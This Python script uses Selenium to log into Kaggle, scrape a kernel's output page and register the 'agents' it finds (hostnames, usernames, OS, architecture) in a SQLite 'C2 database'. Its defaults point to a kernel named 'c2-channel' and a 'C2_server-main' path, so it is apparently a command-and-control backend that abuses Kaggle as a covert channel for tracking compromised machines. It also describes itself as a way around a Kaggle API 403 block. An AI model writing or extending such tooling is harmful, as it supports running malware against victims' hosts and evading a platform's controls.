#!/usr/bin/env python3
"""
Selenium-based Kernel Output Reader

Reads Kaggle kernel output using Selenium (bypasses API 403 error).
This is the only way to get kernel output when Kaggle API is blocked.
"""

import os
import json
import time
import re
from pathlib import Path
from typing import Dict, Any, List, Optional


def read_kernel_output_selenium(
    kernel_slug: str,
    username: str,
    password: str,
    output_dir: str = "/tmp/kernel_output",
    headless: bool = True
) -> Dict[str, Any]:
    """
    Read kernel output using Selenium.
    
    Args:
        kernel_slug: Kernel slug (e.g., "username/kernel-name")
        username: Kaggle username
        password: Kaggle password
        output_dir: Directory to save output files
        headless: Run browser in headless mode
    
    Returns:
        Dict with output files and status
    """
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
    except ImportError:
        return {"error": "Selenium not installed"}
    
    # Setup Chrome options
    options = Options()
    if headless:
        options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    
    try:
        # Create browser
        driver = webdriver.Chrome(options=options)
        
        # Login to Kaggle
        print("[SELENIUM] Logging in to Kaggle...")
        driver.get("https://www.kaggle.com/account/login")
        
        # Wait for login form
        wait = WebDriverWait(driver, 30)
        
        # Fill login form
        email_input = wait.until(EC.presence_of_element_located((By.NAME, "email")))
        password_input = driver.find_element(By.NAME, "password")
        
        email_input.send_keys(username)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        
        # Wait for login to complete
        time.sleep(5)
        
        # Navigate to kernel output page
        kernel_url = f"https://www.kaggle.com/code/{kernel_slug}/output"
        print(f"[SELENIUM] Navigating to: {kernel_url}")
        driver.get(kernel_url)
        
        # Wait for output to load
        time.sleep(5)
        
        # Get page source
        page_source = driver.page_source
        
        # Parse output files from page
        output_files = []
        
        # Look for JSON files in output
        json_pattern = re.compile(r'"name"\s*:\s*"([^"]+\.json)"')
        json_matches = json_pattern.findall(page_source)
        
        for filename in json_matches:
            # Try to find download link
            download_pattern = re.compile(rf'href="([^"]*{re.escape(filename)}[^"]*)"')
            download_match = download_pattern.search(page_source)
            
            if download_match:
                download_url = download_match.group(1)
                if not download_url.startswith("http"):
                    download_url = f"https://www.kaggle.com{download_url}"
                
                output_files.append({
                    "name": filename,
                    "url": download_url
                })
        
        # Try to extract agent data from page
        agent_pattern = re.compile(r'kaggle-[a-f0-9]{8}')
        agent_ids = list(set(agent_pattern.findall(page_source)))
        
        # Try to extract JSON data directly from page
        json_data_pattern = re.compile(r'\{[^{}]*"id"[^{}]*"kaggle-[^{}]*\}')
        json_matches = json_data_pattern.findall(page_source)
        
        agents = []
        for match in json_matches:
            try:
                data = json.loads(match)
                if "id" in data and "kaggle-" in data.get("id", ""):
                    agents.append(data)
            except:
                pass
        
        driver.quit()
        
        return {
            "status": "ok",
            "output_files": output_files,
            "agent_ids": agent_ids,
            "agents": agents,
            "url": kernel_url
        }
        
    except Exception as e:
        return {"error": str(e)}


def sync_kernel_to_db(
    kernel_slug: str,
    username: str,
    password: str,
    db_path: str
) -> Dict[str, Any]:
    """
    Sync kernel output to C2 database.
    
    Args:
        kernel_slug: Kernel slug
        username: Kaggle username
        password: Kaggle password
        db_path: Path to C2 database
    
    Returns:
        Dict with sync status
    """
    import sqlite3
    
    # Read kernel output
    result = read_kernel_output_selenium(kernel_slug, username, password)
    
    if "error" in result:
        return result
    
    # Sync agents to DB
    agents = result.get("agents", [])
    agent_ids = result.get("agent_ids", [])
    
    conn = sqlite3.connect(db_path)
    synced = []
    
    # Sync from parsed JSON
    for agent in agents:
        agent_id = agent.get("id", "")
        if not agent_id:
            continue
        
        existing = conn.execute(
            "SELECT id FROM agents WHERE id=?", (agent_id,)
        ).fetchone()
        
        if existing:
            conn.execute("""
                UPDATE agents SET 
                    last_seen=datetime('now'),
                    is_alive=1,
                    hostname=?
                WHERE id=?
            """, (agent.get("hostname", ""), agent_id))
        else:
            conn.execute("""
                INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                agent_id,
                agent.get("hostname", ""),
                agent.get("username", "kaggle"),
                agent.get("os", "linux"),
                agent.get("arch", "x64"),
                "kaggle",
                agent.get("platform_type", "kaggle")
            ))
        
        synced.append(agent_id)
    
    # Sync from agent IDs found in page
    for agent_id in agent_ids:
        if agent_id not in synced:
            existing = conn.execute(
                "SELECT id FROM agents WHERE id=?", (agent_id,)
            ).fetchone()
            
            if not existing:
                conn.execute("""
                    INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (
                    agent_id,
                    agent_id.split("-")[-1] if "-" in agent_id else "unknown",
                    "kaggle", "linux", "x64", "kaggle", "kaggle"
                ))
                synced.append(agent_id)
    
    conn.commit()
    conn.close()
    
    return {
        "status": "ok",
        "synced": len(synced),
        "agents": synced
    }


if __name__ == "__main__":
    import sys
    
    kernel_slug = sys.argv[1] if len(sys.argv) > 1 else "cassandradixon320631/c2-channel"
    username = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("KAGGLE_USERNAME", "")
    password = sys.argv[3] if len(sys.argv) > 3 else os.environ.get("KAGGLE_PASSWORD", "")
    db_path = sys.argv[4] if len(sys.argv) > 4 else "/mnt/F/C2_server-main/data/c2.db"
    
    if not username or not password:
        print("Error: KAGGLE_USERNAME and KAGGLE_PASSWORD required")
        sys.exit(1)
    
    result = sync_kernel_to_db(kernel_slug, username, password, db_path)
    print(json.dumps(result, indent=2))
